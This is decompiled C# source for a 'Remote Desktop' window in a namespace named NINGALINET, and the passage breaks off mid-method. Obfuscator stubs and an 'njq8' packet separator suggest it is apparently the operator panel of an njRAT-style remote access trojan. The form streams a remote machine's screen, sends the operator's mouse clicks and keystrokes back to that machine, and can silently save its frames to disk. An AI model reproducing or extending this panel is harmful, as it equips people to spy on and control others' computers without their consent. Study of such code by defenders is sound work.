using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace NINGALINET
{
	// Token: 0x02000009 RID: 9
	[DesignerGenerated]
	public partial class FDesktop : Form
	{
		// Token: 0x0600005F RID: 95 RVA: 0x000028B3 File Offset: 0x00000AB3
		[DebuggerNonUserCode]
		static FDesktop()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FDesktop.__ENCList = new List<WeakReference>();
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00006E30 File Offset: 0x00005030
		public FDesktop()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.FormClosing += new FormClosingEventHandler(this.FDesktop_FormClosing);
			base.KeyUp += new KeyEventHandler(this.FDesktop_KeyUp);
			base.Load += new EventHandler(this.Cap_Load);
			FDesktop.__ENCAddToList(this);
			this.K = 0;
			this.siz1 = 0;
			this.op = new Point(1, 1);
			this.siz2 = Fungsi.Siz(0L);
			this.InitializeComponent();
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00006EC8 File Offset: 0x000050C8
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FDesktop.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FDesktop.__ENCList.Count == FDesktop.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FDesktop.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FDesktop.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FDesktop.__ENCList[num] = FDesktop.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FDesktop.__ENCList.RemoveRange(num, FDesktop.__ENCList.Count - num);
						FDesktop.__ENCList.Capacity = FDesktop.__ENCList.Count;
					}
					FDesktop.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x06000064 RID: 100 RVA: 0x00007D7C File Offset: 0x00005F7C
		// (set) Token: 0x06000065 RID: 101 RVA: 0x000028C4 File Offset: 0x00000AC4
		internal virtual ComboBox C1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._C1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._C1 = value;
			}
		}

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x06000066 RID: 102 RVA: 0x00007D94 File Offset: 0x00005F94
		// (set) Token: 0x06000067 RID: 103 RVA: 0x00007DAC File Offset: 0x00005FAC
		internal virtual ComboBox C2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._C2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.C2_MouseUp);
				if (this._C2 != null)
				{
					this._C2.MouseUp -= value2;
				}
				this._C2 = value;
				if (this._C2 != null)
				{
					this._C2.MouseUp += value2;
				}
			}
		}

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x06000068 RID: 104 RVA: 0x00007E04 File Offset: 0x00006004
		// (set) Token: 0x06000069 RID: 105 RVA: 0x000028CD File Offset: 0x00000ACD
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x0600006A RID: 106 RVA: 0x00007E1C File Offset: 0x0000601C
		// (set) Token: 0x0600006B RID: 107 RVA: 0x000028D6 File Offset: 0x00000AD6
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x0600006C RID: 108 RVA: 0x00007E34 File Offset: 0x00006034
		// (set) Token: 0x0600006D RID: 109 RVA: 0x000028DF File Offset: 0x00000ADF
		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox1 = value;
			}
		}

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x0600006E RID: 110 RVA: 0x00007E4C File Offset: 0x0000604C
		// (set) Token: 0x0600006F RID: 111 RVA: 0x000028E8 File Offset: 0x00000AE8
		internal virtual NumericUpDown C
		{
			[DebuggerNonUserCode]
			get
			{
				return this._C;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._C = value;
			}
		}

		// Token: 0x1700002E RID: 46
		// (get) Token: 0x06000070 RID: 112 RVA: 0x00007E64 File Offset: 0x00006064
		// (set) Token: 0x06000071 RID: 113 RVA: 0x00007E7C File Offset: 0x0000607C
		internal virtual CheckBox CheckBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox2_CheckedChanged);
				if (this._CheckBox2 != null)
				{
					this._CheckBox2.CheckedChanged -= value2;
				}
				this._CheckBox2 = value;
				if (this._CheckBox2 != null)
				{
					this._CheckBox2.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x1700002F RID: 47
		// (get) Token: 0x06000072 RID: 114 RVA: 0x00007ED4 File Offset: 0x000060D4
		// (set) Token: 0x06000073 RID: 115 RVA: 0x000028F1 File Offset: 0x00000AF1
		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		// Token: 0x17000030 RID: 48
		// (get) Token: 0x06000074 RID: 116 RVA: 0x00007EEC File Offset: 0x000060EC
		// (set) Token: 0x06000075 RID: 117 RVA: 0x000028FA File Offset: 0x00000AFA
		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox3 = value;
			}
		}

		// Token: 0x17000031 RID: 49
		// (get) Token: 0x06000076 RID: 118 RVA: 0x00007F04 File Offset: 0x00006104
		// (set) Token: 0x06000077 RID: 119 RVA: 0x00002903 File Offset: 0x00000B03
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Timer1 = value;
			}
		}

		// Token: 0x17000032 RID: 50
		// (get) Token: 0x06000078 RID: 120 RVA: 0x00007F1C File Offset: 0x0000611C
		// (set) Token: 0x06000079 RID: 121 RVA: 0x00007F34 File Offset: 0x00006134
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x17000033 RID: 51
		// (get) Token: 0x0600007A RID: 122 RVA: 0x00007F8C File Offset: 0x0000618C
		// (set) Token: 0x0600007B RID: 123 RVA: 0x0000290C File Offset: 0x00000B0C
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x17000034 RID: 52
		// (get) Token: 0x0600007C RID: 124 RVA: 0x00007FA4 File Offset: 0x000061A4
		// (set) Token: 0x0600007D RID: 125 RVA: 0x00007FBC File Offset: 0x000061BC
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				if (this._Button2 != null)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				if (this._Button2 != null)
				{
					this._Button2.Click += value2;
				}
			}
		}

		// Token: 0x17000035 RID: 53
		// (get) Token: 0x0600007E RID: 126 RVA: 0x00008014 File Offset: 0x00006214
		// (set) Token: 0x0600007F RID: 127 RVA: 0x0000802C File Offset: 0x0000622C
		internal virtual PictureBox P1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._P1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.P1_Paint);
				MouseEventHandler value3 = new MouseEventHandler(this.P1_MouseMove);
				MouseEventHandler value4 = new MouseEventHandler(this.P1_MouseDown);
				if (this._P1 != null)
				{
					this._P1.Paint -= value2;
					this._P1.MouseMove -= value3;
					this._P1.MouseDown -= value4;
				}
				this._P1 = value;
				if (this._P1 != null)
				{
					this._P1.Paint += value2;
					this._P1.MouseMove += value3;
					this._P1.MouseDown += value4;
				}
			}
		}

		// Token: 0x17000036 RID: 54
		// (get) Token: 0x06000080 RID: 128 RVA: 0x000080D0 File Offset: 0x000062D0
		// (set) Token: 0x06000081 RID: 129 RVA: 0x000080E8 File Offset: 0x000062E8
		internal virtual CheckBox CheckBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox4_CheckedChanged);
				if (this._CheckBox4 != null)
				{
					this._CheckBox4.CheckedChanged -= value2;
				}
				this._CheckBox4 = value;
				if (this._CheckBox4 != null)
				{
					this._CheckBox4.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x17000037 RID: 55
		// (get) Token: 0x06000082 RID: 130 RVA: 0x00008140 File Offset: 0x00006340
		// (set) Token: 0x06000083 RID: 131 RVA: 0x00002915 File Offset: 0x00000B15
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x06000084 RID: 132 RVA: 0x00008158 File Offset: 0x00006358
		// (set) Token: 0x06000085 RID: 133 RVA: 0x0000291E File Offset: 0x00000B1E
		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x06000086 RID: 134 RVA: 0x00008170 File Offset: 0x00006370
		// (set) Token: 0x06000087 RID: 135 RVA: 0x00002927 File Offset: 0x00000B27
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x06000088 RID: 136 RVA: 0x00008188 File Offset: 0x00006388
		// (set) Token: 0x06000089 RID: 137 RVA: 0x00002930 File Offset: 0x00000B30
		internal virtual ToolStripMenuItem SaveAsImageToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveAsImageToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SaveAsImageToolStripMenuItem = value;
			}
		}

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x0600008A RID: 138 RVA: 0x000081A0 File Offset: 0x000063A0
		// (set) Token: 0x0600008B RID: 139 RVA: 0x000081B8 File Offset: 0x000063B8
		internal virtual ToolStripMenuItem ScreenOptionsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ScreenOptionsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ScreenOptionsToolStripMenuItem_Click);
				if (this._ScreenOptionsToolStripMenuItem != null)
				{
					this._ScreenOptionsToolStripMenuItem.Click -= value2;
				}
				this._ScreenOptionsToolStripMenuItem = value;
				if (this._ScreenOptionsToolStripMenuItem != null)
				{
					this._ScreenOptionsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x0600008C RID: 140 RVA: 0x00008210 File Offset: 0x00006410
		// (set) Token: 0x0600008D RID: 141 RVA: 0x00008228 File Offset: 0x00006428
		internal virtual Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				if (this._Timer2 != null)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				if (this._Timer2 != null)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x0600008E RID: 142 RVA: 0x00008280 File Offset: 0x00006480
		// (set) Token: 0x0600008F RID: 143 RVA: 0x00002939 File Offset: 0x00000B39
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00008298 File Offset: 0x00006498
		public object U()
		{
			string[] array = Strings.Split(File.ReadAllText(Application.StartupPath + "\\Bin\\Desktop.ini"), "\r\n", -1, CompareMethod.Binary);
			object result;
			if (Operators.CompareString(array[Conversions.ToInteger(this.K)].ToString(), "False", false) == 0)
			{
				result = false;
			}
			else if (Operators.CompareString(array[Conversions.ToInteger(this.K)].ToString(), "True", false) == 0)
			{
				result = true;
			}
			else
			{
				result = array[Conversions.ToInteger(this.K)].ToString();
			}
			this.K = Operators.AddObject(this.K, 1);
			return result;
		}

		// Token: 0x06000091 RID: 145 RVA: 0x0000834C File Offset: 0x0000654C
		public string SS(string f)
		{
			this.sev = Operators.AddObject(this.sev, f + "\r\n");
			return Conversions.ToString(this.sev);
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00008384 File Offset: 0x00006584
		private void FDesktop_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (File.Exists(Application.StartupPath + "\\Bin\\Desktop.ini"))
			{
				File.Delete(Application.StartupPath + "\\Bin\\Desktop.ini");
			}
			this.SS(Conversions.ToString(this.CheckBox1.Checked));
			this.SS(Conversions.ToString(this.CheckBox2.Checked));
			this.SS(Conversions.ToString(this.CheckBox3.Checked));
			this.SS(Conversions.ToString(this.CheckBox4.Checked));
			this.SS(Conversions.ToString(this.C.Value));
			this.SS(Conversions.ToString(this.C1.SelectedIndex));
			this.SS(Conversions.ToString(this.C2.SelectedIndex));
			File.WriteAllText(Application.StartupPath + "\\Bin\\Desktop.ini", Conversions.ToString(this.sev));
			this.sev = "";
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00008488 File Offset: 0x00006688
		private void FDesktop_KeyUp(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.O & e.Control)
			{
				e.SuppressKeyPress = true;
				if (this.Panel1.Visible)
				{
					this.Panel1.Visible = false;
				}
				else
				{
					this.Panel1.Visible = true;
				}
			}
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000084D8 File Offset: 0x000066D8
		private void Cap_Load(object sender, EventArgs e)
		{
			this.Text = Conversions.ToString(Operators.AddObject("Remote Desktop - ", ima.vno(this.osk.L)));
			this.point_2 = new Point(30, 30);
			PictureBox p = this.P1;
			PictureBox obj = p;
			lock (obj)
			{
				Control p2 = this.P1;
				p2.KeyUp += new KeyEventHandler(this.KUP);
				p2.KeyDown += new KeyEventHandler(this.KDW);
			}
			int num = 0;
			checked
			{
				do
				{
					this.C1.Items.Add(this.QZ(num));
					num++;
				}
				while (num <= 13);
				int num2 = 1;
				do
				{
					this.C2.Items.Add(num2);
					num2++;
				}
				while (num2 <= 10);
				this.folder = Operators.ConcatenateObject(Operators.ConcatenateObject(this.osk.Folder, ima.vno(this.osk.L)), "\\Desktop\\");
				if (!Directory.Exists(Conversions.ToString(this.folder)))
				{
					Directory.CreateDirectory(Conversions.ToString(this.folder));
				}
				this.P1.Image = new Bitmap(this.Sz.Width, this.Sz.Height);
				this.CheckBox1.Checked = Conversions.ToBoolean(Fungsi.GTV("Ds1", Conversions.ToString(this.CheckBox1.Checked)));
				this.CheckBox2.Checked = Conversions.ToBoolean(Fungsi.GTV("Ds2", Conversions.ToString(this.CheckBox2.Checked)));
				this.CheckBox3.Checked = Conversions.ToBoolean(Fungsi.GTV("Ds3", Conversions.ToString(this.CheckBox3.Checked)));
				this.C.Value = Conversions.ToDecimal(Fungsi.GTV("Ds5", Conversions.ToString(this.C.Value)));
				this.C1.SelectedIndex = Conversions.ToInteger(Fungsi.GTV("Ds6", Conversions.ToString(4)));
				this.C2.SelectedIndex = Conversions.ToInteger(Fungsi.GTV("Ds7", Conversions.ToString(4)));
				if (ima.F.SAUT2.Checked)
				{
					this.Button1.PerformClick();
					this.Panel1.Visible = false;
					this.TextBox1.Visible = true;
					this.Timer2.Start();
				}
			}
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00008760 File Offset: 0x00006960
		public void PktToImage(byte[] BY)
		{
			if (Operators.CompareString(this.Button1.Text, "Stop", false) == 0)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"@",
					ima.Y,
					Conversions.ToString(this.C1.SelectedIndex),
					ima.Y,
					this.C2.Text,
					ima.Y,
					Conversions.ToString(this.C.Value)
				}));
			}
			Point right;
			if (!(this.op == right) && Operators.CompareString(this.Button1.Text, "Stop", false) == 0)
			{
				Point point = new Point(0, 0);
				point.X = this.op.X;
				point.Y = this.op.Y;
				this.op = default(Point);
				this.sk.Send(string.Concat(new string[]
				{
					"$",
					ima.Y,
					Conversions.ToString(point.X),
					ima.Y,
					Conversions.ToString(point.Y),
					ima.Y
				}));
			}
			Array instance = Fungsi.fx(BY, "njq8");
			MemoryStream stream = new MemoryStream((byte[])NewLateBinding.LateIndexGet(instance, new object[]
			{
				1
			}, null));
			Bitmap bitmap = (Bitmap)Image.FromStream(stream);
			byte[] array = (byte[])NewLateBinding.LateIndexGet(instance, new object[]
			{
				0
			}, null);
			string arg_1DB_0 = Fungsi.BS(ref array);
			NewLateBinding.LateIndexSetComplex(instance, new object[]
			{
				0,
				array
			}, null, true, false);
			string[] array2 = Strings.Split(arg_1DB_0, ",", -1, CompareMethod.Binary);
			checked
			{
				this.siz2 = Fungsi.Siz((long)BY.Length);
				this.siz1 = array2.Length - 2;
				IntPtr callbackData;
				Bitmap bitmap2 = (Bitmap)this.P1.Image.GetThumbnailImage(Conversions.ToInteger(Strings.Split(array2[0], ".", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array2[0], ".", -1, CompareMethod.Binary)[1]), null, callbackData);
				Graphics graphics = Graphics.FromImage(bitmap2);
				int num = 0;
				int arg_25E_0 = 1;
				int num2 = array2.Length - 2;
				int num3 = arg_25E_0;
				while (true)
				{
					int arg_3B5_0 = num3;
					int num4 = num2;
					if (arg_3B5_0 > num4)
					{
						break;
					}
					Point point2 = new Point(Conversions.ToInteger(Strings.Split(array2[num3], ".", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array2[num3], ".", -1, CompareMethod.Binary)[1]));
					Size size = new Size(bitmap.Width, Conversions.ToInteger(Strings.Split(array2[num3], ".", -1, CompareMethod.Binary)[2]));
					Graphics arg_336_0 = graphics;
					Bitmap arg_2F8_0 = bitmap;
					Rectangle rect = new Rectangle(0, num, bitmap.Width, Conversions.ToInteger(Strings.Split(array2[num3], ".", -1, CompareMethod.Binary)[2]));
					Image arg_336_1 = arg_2F8_0.Clone(rect, bitmap.PixelFormat);
					Point point3 = new Point(Conversions.ToInteger(Strings.Split(array2[num3], ".", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array2[num3], ".", -1, CompareMethod.Binary)[1]));
					arg_336_0.DrawImage(arg_336_1, point3);
					if (this.CheckBox1.Checked)
					{
						Rectangle rect2 = new Rectangle(Conversions.ToInteger(Strings.Split(array2[num3], ".", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array2[num3], ".", -1, CompareMethod.Binary)[1]), size.Width, size.Height);
						graphics.DrawRectangle(Pens.Red, rect2);
					}
					num += size.Height;
					num3++;
				}
				graphics.Dispose();
				this.P1.Image = bitmap2;
				if (this.CheckBox4.Checked)
				{
					try
					{
						bitmap2.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.folder, Fungsi.DT()), ".jpg")));
					}
					catch (Exception expr_404)
					{
						ProjectData.SetProjectError(expr_404);
						ProjectData.ClearProjectError();
					}
				}
			}
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00008B90 File Offset: 0x00006D90
		public Size QZ(int q)
		{
			Size size = new Size((Point)this.Sz);
			checked
			{
				Size result;
				switch (q)
				{
				case 0:
					result = this.Sz;
					return result;
				case 1:
					size.Width = (int)Math.Round((double)size.Width / 1.1);
					size.Height = (int)Math.Round((double)size.Height / 1.1);
					break;
				case 2:
					size.Width = (int)Math.Round((double)size.Width / 1.3);
					size.Height = (int)Math.Round((double)size.Height / 1.3);
					break;
				case 3:
					size.Width = (int)Math.Round((double)size.Width / 1.5);
					size.Height = (int)Math.Round((double)size.Height / 1.5);
					break;
				case 4:
					size.Width = (int)Math.Round((double)size.Width / 1.9);
					size.Height = (int)Math.Round((double)size.Height / 1.9);
					break;
				case 5:
					size.Width = (int)Math.Round((double)size.Width / 2.0);
					size.Height = (int)Math.Round((double)size.Height / 2.0);
					break;
				case 6:
					size.Width = (int)Math.Round((double)size.Width / 2.1);
					size.Height = (int)Math.Round((double)size.Height / 2.1);
					break;
				case 7:
					size.Width = (int)Math.Round((double)size.Width / 2.2);
					size.Height = (int)Math.Round((double)size.Height / 2.2);
					break;
				case 8:
					size.Width = (int)Math.Round((double)size.Width / 2.5);
					size.Height = (int)Math.Round((double)size.Height / 2.5);
					break;
				case 9:
					size.Width = (int)Math.Round((double)size.Width / 3.0);
					size.Height = (int)Math.Round((double)size.Height / 3.0);
					break;
				case 10:
					size.Width = (int)Math.Round((double)size.Width / 3.5);
					size.Height = (int)Math.Round((double)size.Height / 3.5);
					break;
				case 11:
					size.Width = (int)Math.Round((double)size.Width / 4.0);
					size.Height = (int)Math.Round((double)size.Height / 4.0);
					break;
				case 12:
					size.Width = (int)Math.Round((double)size.Width / 5.0);
					size.Height = (int)Math.Round((double)size.Height / 5.0);
					break;
				case 13:
					size.Width = (int)Math.Round((double)size.Width / 6.0);
					size.Height = (int)Math.Round((double)size.Height / 6.0);
					break;
				}
				size.Width = Conversions.ToInteger(Strings.Mid(size.Width.ToString(), 1, size.Width.ToString().Length - 1) + Conversions.ToString(0));
				size.Height = Conversions.ToInteger(Strings.Mid(size.Height.ToString(), 1, size.Height.ToString().Length - 1) + Conversions.ToString(0));
				result = size;
				return result;
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00008FE8 File Offset: 0x000071E8
		public void KDW(object sender, KeyEventArgs e)
		{
			if (Operators.CompareString(this.Button1.Text, "Start", false) != 0)
			{
				this.P1.Focus();
				if (this.CheckBox3.Checked)
				{
					Keys keyCode = e.KeyCode;
					bool arg_66_0;
					if (keyCode != Keys.Shift)
					{
						if (keyCode != Keys.ShiftKey)
						{
							if (keyCode != Keys.LShiftKey)
							{
								if (keyCode != Keys.RShiftKey)
								{
									arg_66_0 = false;
									goto IL_66;
								}
							}
						}
					}
					arg_66_0 = true;
					IL_66:
					if (arg_66_0)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"##",
							ima.Y,
							Conversions.ToString(0),
							ima.Y,
							Conversions.ToString(16)
						}));
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"##",
							ima.Y,
							Conversions.ToString(0),
							ima.Y,
							Conversions.ToString((int)e.KeyCode)
						}));
					}
				}
				e.SuppressKeyPress = true;
			}
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000090F4 File Offset: 0x000072F4
		public void KUP(object sender, KeyEventArgs e)
		{
			if (Operators.CompareString(this.Button1.Text, "Start", false) != 0)
			{
				this.P1.Focus();
				if (this.CheckBox3.Checked)
				{
					Keys keyCode = e.KeyCode;
					bool arg_66_0;
					if (keyCode != Keys.Shift)
					{
						if (keyCode != Keys.ShiftKey)
						{
							if (keyCode != Keys.LShiftKey)
							{
								if (keyCode != Keys.RShiftKey)
								{
									arg_66_0 = false;
									goto IL_66;
								}
							}
						}
					}
					arg_66_0 = true;
					IL_66:
					if (arg_66_0)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"##",
							ima.Y,
							Conversions.ToString(2),
							ima.Y,
							Conversions.ToString(16)
						}));
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"##",
							ima.Y,
							Conversions.ToString(2),
							ima.Y,
							Conversions.ToString((int)e.KeyCode)
						}));
					}
				}
				e.SuppressKeyPress = true;
			}
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00009200 File Offset: 0x00007400
		private void Button2_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Title = "Save File";
			saveFileDialog.FileName = "Screenshot";
			saveFileDialog.Filter = "Jpeg |*.jpg";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.P1.Image.Save(saveFileDialog.FileName, ImageFormat.Jpeg);
				Interaction.MsgBox("Saving Success!", MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00009268 File Offset: 0x00007468
		private void Button1_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.Button1.Text, "Start", false) == 0)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"@",
					ima.Y,
					Conversions.ToString(this.C1.SelectedIndex),
					ima.Y,
					this.C2.Text,
					ima.Y,
					Conversions.ToString(this.C.Value)
				}));
				this.Button1.Text = "Stop";
				this.Panel1.Visible = false;
			}
			else
			{
				this.Button1.Text = "Start";
				this.siz1 = 0;
				this.siz2 = 0;
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00009348 File Offset: 0x00007548
		private void P1_MouseDown(object sender, MouseEventArgs e)
		{
			if (this.CheckBox2.Checked)
			{
				Point point = checked(new Point((int)Math.Round(unchecked((double)e.X * ((double)this.Sz.Width / (double)this.P1.Width))), (int)Math.Round(unchecked((double)e.Y * ((double)this.Sz.Height / (double)this.P1.Height)))));
				int value;
				if (e.Button == MouseButtons.Left)
				{
					value = 2;
				}
				if (e.Button == MouseButtons.Right)
				{
					value = 8;
				}
				this.sk.Send(string.Concat(new string[]
				{
					"#",
					ima.Y,
					Conversions.ToString(point.X),
					ima.Y,
					Conversions.ToString(point.Y),
					ima.Y,
					Conversions.ToString(value)
				}));
			}
		}

		// Token: 0x0600009C RID: 156 RVA: 0x0000943C File Offset: 0x0000763C
		private void P1_MouseMove(object sender, MouseEventArgs e)
		{
			this.point_2 = e.Location;
			if (this.CheckBox2.Checked && Operators.CompareString(this.Button1.Text, "Stop", false) == 0)
			{
				Point left = checked(new Point((int)Math.Round(unchecked((double)e.X * ((double)this.Sz.Width / (double)this.P1.Width))), (int)Math.Round(unchecked((double)e.Y * ((double)this.Sz.Height / (double)this.P1.Height)))));
				if (left != this.op)
				{
					this.op = left;
				}
			}
			PictureBox p = this.P1;
			PictureBox obj = p;
			lock (obj)
			{
				if ((!this.P1.Focused & this.CheckBox3.Checked) | this.CheckBox2.Checked)
				{
					this.P1.Focus();
				}
			}
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00009548 File Offset: 0x00007748
		private void P1_Paint(object sender, PaintEventArgs e)
		{
			string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(this.siz1, " FPS"), '\r'), '\n'), this.siz2));
			Size size = TextRenderer.MeasureText(text, new Font(this.Font, FontStyle.Bold));
			if (!(this.point_2.X < size.Width & this.point_2.Y < size.Height))
			{
				Rectangle rect = new Rectangle(0, 0, size.Width, size.Height);
				e.Graphics.FillRectangle(new Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rect);
				Brush brush = Brushes.Red;
				try
				{
					if (Operators.ConditionalCompareObjectGreater(this.siz1, 3, false))
					{
						brush = Brushes.YellowGreen;
					}
					if (Operators.ConditionalCompareObjectGreater(this.siz1, 6, false))
					{
						brush = Brushes.LimeGreen;
					}
				}
				catch (Exception expr_F0)
				{
					ProjectData.SetProjectError(expr_F0);
